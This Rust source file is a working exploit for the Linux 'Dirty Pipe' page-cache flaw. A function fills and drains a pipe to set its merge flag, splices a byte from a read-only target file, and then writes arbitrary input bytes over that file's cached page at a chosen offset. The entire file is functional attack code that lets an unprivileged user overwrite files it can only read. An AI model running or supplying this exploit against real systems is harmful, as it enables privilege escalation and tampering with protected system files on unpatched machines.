use libc::{splice, open, O_RDONLY, loff_t};
use std::io::{pipe, Read, Write};
use std::os::fd::AsRawFd;
use anyhow::{Result};
use std::fs;
use std::ffi::CString;
use std::ptr::null_mut;
use std::path::PathBuf;

pub const PIPE_SIZE: usize = 65536; // Default size of pipe. Used to fill it.

/*
Run the exploit. Overwrite the provided file at the given offset.
*/
pub fn exploit(input: PathBuf, output: PathBuf, offset: i64) -> Result<(), anyhow::Error> {
    // Read input file.
    let mut input_buf: Vec<u8> = fs::read(&input)?;

     if offset == 0 {
        println!("[!] Warning: Offset set to 0. This exploit cannot overwrite the first byte of the target. Skipping the first byte.");
        input_buf = Vec::from(&input_buf[1..]);
    }

    // Create pipe
    let (mut dirty_pipe_rx, mut dirty_pipe_tx) = pipe()?;
    println!("[-] Created pipe.");

    // Fill with some data to set the PIPE_FLAG_CAN_MERGE flag
    let mut data: Vec<u8> = vec![0u8; PIPE_SIZE];
    dirty_pipe_tx.write_all(&data)?;
    println!("[-] Filled pipe.");

    // Drain pipe
    let bytes_read = dirty_pipe_rx.read(&mut data)?;
    println!("[-] Drained (read) {} bytes", bytes_read);

    // Read the target file to enter it into page cache
    fs::read(&output)?;

    // Splice data from target file into the pipe
    println!("[-] Splicing...");
    let file_path = CString::new(output.to_str().unwrap())?; // Convert to c-string so we can call open()
    let mut offset: loff_t = offset;
    let num_bytes = unsafe {
        // Open file read only
        let fd = open(file_path.as_ptr(), O_RDONLY);

        // Splice
        splice(fd, &mut offset, dirty_pipe_tx.as_raw_fd(), null_mut(), 1, 0)
    };
    
    println!("[-] Bytes spliced: {}", num_bytes);

    // Write arbitrary data into the pipe.
    // This overwrites the cached file page instead of
    // creating a new one (due to merge flag).
    dirty_pipe_tx.write_all(&input_buf)?;
    drop(dirty_pipe_tx);

    println!("[-] Exploit complete.");

    Ok(())
}